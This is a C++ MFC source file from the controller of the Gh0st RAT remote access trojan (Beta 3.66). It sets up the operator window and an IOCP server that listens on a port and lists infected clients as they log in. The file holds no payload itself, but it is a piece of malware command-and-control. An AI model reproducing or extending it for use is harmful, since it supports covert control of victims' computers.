
// MainFrm.cpp : CMainFrame 类的实现
//

#include "stdafx.h"
#include "Gh0st.h"
#include "../common/macros.h"
#include "MainFrm.h"
#include "Gh0stView.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
CIOCPServer  * g_iocpServer = NULL;
CGh0stView * g_pConnectView = NULL;
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_CLOSE()
END_MESSAGE_MAP()




static UINT indicators[] =
{
	IDS_STATUSTIP,           // 状态行指示器
	IDS_STATUSSPEED,
	IDS_STATUSPORT,
	IDS_STATUSCOUNT,
};

// CMainFrame 构造/析构

CMainFrame::CMainFrame()
{
	// TODO: 在此添加成员初始化代码
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

// 	if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP | CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
// 		!m_wndToolBar.LoadToolBar(IDR_MAINFRAME))
// 	{
// 		TRACE0("未能创建工具栏\n");
// 		return -1;      // 未能创建
// 	}

	if (!m_wndStatusBar.Create(this))
	{
		TRACE0("未能创建状态栏\n");
		return -1;      // 未能创建
	}
	m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT));



	// TODO: 如果不需要可停靠工具栏，则删除这三行
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 150);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 80);

	if (!m_wndTab.Create(WS_CHILD | WS_VISIBLE | CTCS_AUTOHIDEBUTTONS | CTCS_TOOLTIPS | CTCS_DRAGMOVE | CTCS_LEFT,CRect(0,0,0,20),this,IDC_TABCTRL))
	{
		TRACE0("failed to create\n");
		return -1;
	}
	m_wndTab.SetDragCursors(AfxGetApp()->LoadStandardCursor(IDC_CROSS), NULL);
	m_wndTab.ModifyStyle(CTCS_LEFT, 0, 0);
	EnableDocking(CBRS_ALIGN_ANY);

	return 0;
}



BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: 在此处通过修改
	//  CREATESTRUCT cs 来修改窗口类或样式
	cs.cx = 646;
	cs.cy = 310;
	if (((CGh0stApp*)AfxGetApp())->m_bIsQQwryExist)
	{
		cs.cx += 100;
	}
	cs.style &= ~FWS_ADDTOTITLE;
	
	cs.lpszName = "Gh0st RAT Beta 3.66";

	return TRUE;
}

// CMainFrame 诊断

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG


// CMainFrame 消息处理程序

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_LOGIN:
	{
		
// 		CString str;
// 		str.Format("%d", LoginInFo->dwSpeed);
// 		AfxMessageBox(str);
		g_pConnectView->PostMessageA(WM_ADDTOLIST, 0, (LPARAM)pContext);
	}
	break;
	default:
		closesocket(pContext->m_Socket);
		break;
	}
}

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*)lpParam;
		g_pConnectView = (CGh0stView * )((CGh0stApp*)AfxGetApp())->m_pConnectView;
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		default:
			break;
		}
	}
	catch (...) {}
}
void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString  str;
	if (g_iocpServer != NULL)
	{
		g_iocpServer->Shutdown();
		delete g_iocpServer;
	}
	g_iocpServer = new CIOCPServer;
	if (g_iocpServer->Initialize(NotifyProc,this,nMaxConnections,nPort))
	{
		char hostname[256];
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{
			for (int i = 0; ;i++)
			{
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if (host->h_addr_list[i] + host->h_length >= host->h_name)
					break;
				str += "/";
			}
		}
		m_wndStatusBar.SetPaneText(0, str);
		str.Format("端口: %d", nPort);
		m_wndStatusBar.SetPaneText(2, str);
	}
	else
	{
		str.Format("端口: %d", nPort);
		m_wndStatusBar.SetPaneText(0, str);
		m_wndStatusBar.SetPaneText(2, "端口：521");
	}
}

void CMainFrame::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	g_iocpServer->Shutdown();
	delete g_iocpServer;
	CFrameWnd::OnClose();
}
